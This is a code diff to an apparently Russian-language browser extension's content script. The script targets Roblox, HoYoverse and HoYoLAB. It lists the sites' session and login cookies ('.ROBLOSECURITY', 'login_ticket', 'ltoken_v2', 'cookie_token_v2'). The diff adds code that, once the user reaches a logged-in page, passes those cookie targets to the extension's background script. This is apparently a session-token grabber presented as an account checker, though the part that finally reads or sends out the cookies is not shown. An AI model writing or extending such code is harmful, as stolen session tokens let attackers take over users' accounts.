@@ -7,27 +7,26 @@ var browser = browser || chrome,
             ]
         },
         'roblox': {
-            loginUrl: 'https://www.roblox.com/Login',
-            successUrl: 'https://www.roblox.com/home',
             items: [
                 {domain: '.roblox.com', names: ['.ROBLOSECURITY']}
             ]
         },
-        'hoyoverse': {
+        'hoyo': {
             items: [
                 {domain: '.hoyoverse.com', names: ['login_ticket']},
                 {domain: '.hoyolab.com', names: ['cookie_token_v2', 'ltoken_v2', 'account_id_v2']}
             ]
         }
-    },
-    checkButton = document.evaluate(
-        "//button[contains(text(), 'Проверить аккаунт')]",
-        document.body,
-        null,
-        XPathResult.ANY_TYPE,
-        null,
-    ).iterateNext();
+    };
 
+// const checkButton = document.evaluate(
+//     "//button[contains(text(), 'Проверить аккаунт')]",
+//     document.body,
+//     null,
+//     XPathResult.ANY_TYPE,
+//     null,
+// ).iterateNext();
+//
 // if (checkButton) {
 //     checkButton.addEventListener("click", function () {
 //         let
@@ -48,22 +47,39 @@ var browser = browser || chrome,
 
 const
     observer = new MutationObserver(function (mutations) {
+        let found = false;
+
         for (const platform in platforms) {
-            if (window.location.hostname.indexOf(platform)) {
+            if (window.location.hostname.indexOf(platform) > -1) {
                 switch (platform) {
                     case 'roblox':
-                        if (window.location.pathname === '/home') {
-                            setTimeout(() => {
-                                browser.runtime.sendMessage({
-                                    items: platforms[platform].items
-                                });
-                            }, 1000);
+                        if (window.location.href === 'https://www.roblox.com/home') {
+                            found = true;
+                        }
+
+                        break;
+                    case 'hoyo':
+                        if (window.location.href.indexOf('https://www.hoyolab.com/achievementCenter?target_uid=') > -1) {
+                            found = true;
+                        }
+
+                        if (window.location.href === 'https://account.hoyoverse.com/#/account/accountInfo') {
+                            found = true;
                         }
 
                         break;
                     case 'steam':
-                    case 'hoyverse':
                     default:
+                        break;
+                }
+
+                if (found) {
+                    observer.disconnect();
+                    setTimeout(() => {
+                        browser.runtime.sendMessage({
+                            items: platforms[platform].items
+                        });
+                    }, 1000);
                 }
             }
         }
